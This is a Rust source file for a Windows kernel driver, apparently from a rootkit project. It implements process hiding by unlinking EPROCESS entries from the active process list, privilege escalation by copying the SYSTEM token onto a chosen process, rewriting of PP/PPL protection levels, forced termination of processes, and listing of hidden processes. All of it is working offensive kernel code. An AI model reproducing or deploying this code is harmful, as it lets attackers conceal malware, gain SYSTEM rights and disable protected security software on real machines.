use alloc::vec::Vec;

use log::{info, error};
use spin::{Lazy, Mutex};
use wdk_sys::*;
use wdk_sys::ntddk::{
    ObfDereferenceObject, 
    PsLookupProcessByProcessId, 
    ZwClose, ZwOpenProcess, 
    ZwTerminateProcess,
};

use common::structs::TargetProcess;
use crate::{PROCESS_SIGNATURE, Result};
use crate::error::ShadowError;
use crate::lock::with_push_lock_exclusive;
use crate::offsets::{
    get_active_process_link_offset, 
    get_process_lock, 
    get_signature_offset, 
    get_token_offset,
};

// Max Number PIDs
const MAX_PID: usize = 100;

/// Represents a process in the operating system.
///
/// The `Process` struct provides a safe abstraction over the `EPROCESS` structure used
/// in Windows kernel development. It allows for looking up a process by its PID and ensures
/// proper cleanup of resources when the structure goes out of scope.
pub struct Process {
    /// Pointer to the EPROCESS structure, used for managing process information.
    pub e_process: PEPROCESS,
}

impl Process {
    /// Creates a new `Process` instance by looking up a process by its PID.
    ///
    /// This method attempts to find a process using its process identifier (PID). If the process
    /// is found, it returns an instance of the `Process` structure containing a pointer to the
    /// `EPROCESS` structure.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the process to be looked up.
    ///
    /// # Returns
    ///
    /// * `Ok(Self)` - Returns a `Process` instance if the process lookup is successful.
    /// * `Err(ShadowError)` - Returns an error message if the lookup fails.
    ///
    /// # Examples
    ///
    /// ```rust,ignore
    /// let process = Process::new(1234);
    /// match process {
    ///     Ok(proc) => println!("Process found: {:?}", proc.e_process),
    ///     Err(e) => println!("Error: {}", e),
    /// }
    /// ```
    #[inline]
    pub fn new(pid: usize) -> Result<Self> {
        let mut e_process = core::ptr::null_mut();

        let status = unsafe { PsLookupProcessByProcessId(pid as _, &mut e_process) };
        if NT_SUCCESS(status) {
            Ok(Self { e_process })
        } else {
            Err(ShadowError::ApiCallFailed("PsLookupProcessByProcessId", status))
        }
    }
}

/// Implements the `Drop` trait for the `Process` structure to handle cleanup when the structure goes out of scope.
///
/// The `Drop` implementation ensures that the reference count on the `EPROCESS` structure
/// is properly decremented when the `Process` instance is dropped. This prevents resource leaks.
impl Drop for Process {
    /// Cleans up the resources held by the `Process` structure.
    ///
    /// This method decrements the reference count of the `EPROCESS` structure when the
    /// `Process` instance is dropped, ensuring proper cleanup.
    fn drop(&mut self) {
        if !self.e_process.is_null() {
            unsafe { ObfDereferenceObject(self.e_process.cast()) };
        }
    }
}

/// List of target processes protected by a mutex.
pub static PROCESS_INFO_HIDE: Lazy<Mutex<Vec<TargetProcess>>> =
    Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_PID)));

/// This implementation focuses on the hiding and unhiding of processes.
impl Process {
    /// Hides a process by removing it from the active process list in the operating system.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process to be hidden.
    ///
    /// # Returns
    ///
    /// * `Ok(LIST_ENTRY)` - Returns the previous `LIST_ENTRY` containing the pointers to the neighboring processes
    ///   in the list before it was modified.
    /// * `Err(ShadowError)` - Returns an error if the process lookup fails or the operation encounters an issue.
    pub unsafe fn hide_process(pid: usize) -> Result<LIST_ENTRY> {
        // Log the start of the process hiding routine.
        info!("Attempting to hide process with PID: {}", pid);

        // Getting offsets based on the Windows build number
        let active_process_link = get_active_process_link_offset();
        let offset_lock = get_process_lock();

        // Retrieve the EPROCESS structure for the target process
        let process = Self::new(pid)?;
        info!("Found EPROCESS for PID {} at address: {:p}", pid, process.e_process);

        // Retrieve the `LIST_ENTRY` for the active process link.
        let current = process.e_process.cast::<u8>().offset(active_process_link) as PLIST_ENTRY;
        info!("Current LIST_ENTRY pointer: {:p}", current);

        // Retrieve the push lock for synchronization.
        let push_lock = process.e_process.cast::<u8>().offset(offset_lock) as *mut u64;
        info!("Using push lock at: {:p}", push_lock);

        // Use synchronization to ensure thread safety while modifying the list.
        with_push_lock_exclusive(push_lock, || {
            info!("Acquired exclusive push lock for process hiding");

            // The next process in the chain
            let next = (*current).Flink;
            // The previous process in the chain
            let previous = (*current).Blink;

            info!("Before unlink: current->Flink = {:p}, current->Blink = {:p}", (*current).Flink, (*current).Blink);
            info!("Neighboring entries: next = {:p}, previous = {:p}", next, previous);

            // Check if the neighboring pointers are valid before proceeding
            if next.is_null() || previous.is_null() {
                error!("One or both of the neighboring pointers are null. Aborting unlink operation.");
                return Err(ShadowError::InvalidListEntry);
            }

            // Storing the previous list entry, which will be returned
            let previous_link = LIST_ENTRY {
                Flink: next as *mut LIST_ENTRY,
                Blink: previous as *mut LIST_ENTRY,
            };

            // Unlink the process from the active list
            (*next).Blink = previous;
            (*previous).Flink = next;
            info!("Unlinked process from active process list");

            // Make the current list entry point to itself to hide the process
            (*current).Flink = current;
            (*current).Blink = current;
            info!("Process LIST_ENTRY modified to point to itself");

            // Log final state of the current entry
            info!("Final state of current LIST_ENTRY: Flink = {:p}, Blink = {:p}", (*current).Flink, (*current).Blink);
            Ok(previous_link)
        })
    }

    /// Unhides a process by restoring it to the active process list in the operating system.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process to be unhidden.
    /// * `list_entry` - A pointer to the previous `LIST_ENTRY`, containing the neighboring processes in the list,
    ///   which was saved when the process was hidden.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - Indicates the process was successfully restored to the active list.
    /// * `Err(ShadowError)` - Returns an error if the process lookup fails or the operation encounters an issue.
    pub unsafe fn unhide_process(pid: usize, list_entry: PLIST_ENTRY) -> Result<NTSTATUS> {
        // Getting offsets based on the Windows build number
        let active_process_link = get_active_process_link_offset();
        let offset_lock = get_process_lock();

        // Retrieve the EPROCESS structure for the target process
        let process = Self::new(pid)?;

        // Retrieve the `LIST_ENTRY` for the active process link, which connects the process
        // to the list of active processes in the system.
        let current = process.e_process.cast::<u8>().offset(active_process_link) as PLIST_ENTRY;
        let push_lock = process.e_process.cast::<u8>().offset(offset_lock) as *mut u64;

        // Use synchronization to ensure thread safety while modifying the list
        with_push_lock_exclusive(push_lock, || {
            // Restore the `Flink` and `Blink` from the saved `list_entry`
            (*current).Flink = (*list_entry).Flink as *mut _LIST_ENTRY;
            (*current).Blink = (*list_entry).Blink as *mut _LIST_ENTRY;

            // Re-link the process to the neighboring processes in the chain
            let next = (*current).Flink;
            let previous = (*current).Blink;

            (*next).Blink = current;
            (*previous).Flink = current;
        });

        Ok(STATUS_SUCCESS)
    }

    /// Enumerates all currently hidden processes.
    ///
    /// This function iterates through the list of hidden processes stored in `PROCESS_INFO_HIDE` and returns
    /// a vector containing their information.
    ///
    /// # Returns
    ///
    /// * A vector containing the information of all hidden processes.
    pub unsafe fn enumerate_hide_processes() -> Vec<TargetProcess> {
        let mut processes: Vec<TargetProcess> = Vec::new();
        let process_info = PROCESS_INFO_HIDE.lock();
        for i in process_info.iter() {
            processes.push(TargetProcess {
                pid: (*i).pid as usize,
                ..Default::default()
            });
        }

        processes
    }
}

/// This implementation focuses on finishing the process, changing the PPL and elevating the process.
impl Process {
    // System process (By default the PID is 4)
    const SYSTEM_PROCESS: usize = 4;

    /// Elevates a process by setting its token to the system process token.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process to elevate.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - Indicates that the token was successfully elevated.
    /// * `Err(ShadowError)` - Returns an error if the process lookup fails or the operation encounters an issue.
    pub unsafe fn elevate_process(pid: usize) -> Result<NTSTATUS> {
        // Get the offset for the token in the EPROCESS structure
        let offset = get_token_offset();

        // Retrieving EPROCESS from the target process
        let target = Self::new(pid)?;

        // Retrieve the EPROCESS for the system process (PID 4)
        let system = Self::new(Self::SYSTEM_PROCESS)?;

        // Access the Token field in the EPROCESS structure of both the target and system processes
        let target_token_ptr = target.e_process.cast::<u8>().offset(offset) as *mut u64;
        let system_token_ptr = system.e_process.cast::<u8>().offset(offset) as *mut u64;

        // Copy the system process token to the target process
        target_token_ptr.write(system_token_ptr.read());
        Ok(STATUS_SUCCESS)
    }

    /// Modifies the protection signature (PP / PPL) of a process in the operating system.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process whose protection signature will be modified.
    /// * `sg` - The signature level (signer) to be set for the process.
    /// * `pt` - The protection type to be applied to the process.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - Returns if the signature and protection levels were successfully updated.
    /// * `Err(ShadowError)` - Returns an error if the process lookup fails or the operation encounters an issue.
    pub unsafe fn protection_signature(pid: usize, sg: usize, tp: usize) -> Result<NTSTATUS> {
        // Get the offset for the protection signature within the EPROCESS structure
        let offset = get_signature_offset();

        // Retrieve the EPROCESS structure for the target process
        let process = Self::new(pid)?;

        // Create the new protection signature value by combining the signature level and protection type
        let new_sign = (sg << 4) | tp;
        let process_signature =
            process.e_process.cast::<u8>().offset(offset) as *mut PROCESS_SIGNATURE;

        // Modify the signature level and protection type of the target process
        (*process_signature).SignatureLevel = new_sign as u8;
        (*process_signature).Protection.SetType(tp as u8);
        (*process_signature).Protection.SetSigner(sg as u8);
        
        Ok(STATUS_SUCCESS)
    }

    /// Terminates a process in the operating system using its process identifier (PID).
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the process to be terminated.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - Returns if the process was successfully terminated.
    /// * `Err(ShadowError)` - Returns an error if any step (opening, terminating, or closing the process) fails.
    pub unsafe fn terminate_process(pid: usize) -> Result<NTSTATUS> {
        let mut h_process: HANDLE = core::ptr::null_mut();
        let mut object_attributes: OBJECT_ATTRIBUTES = core::mem::zeroed();
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: core::ptr::null_mut(),
        };

        // Open a handle to the target process with all access rights
        let mut status = ZwOpenProcess(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
        );

        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Terminate the process with an exit code of 0
        status = ZwTerminateProcess(h_process, 0);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwTerminateProcess", status));
        }

        // Close the handle to the process
        status = ZwClose(h_process);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwClose", status));
        }

        Ok(STATUS_SUCCESS)
    }
}
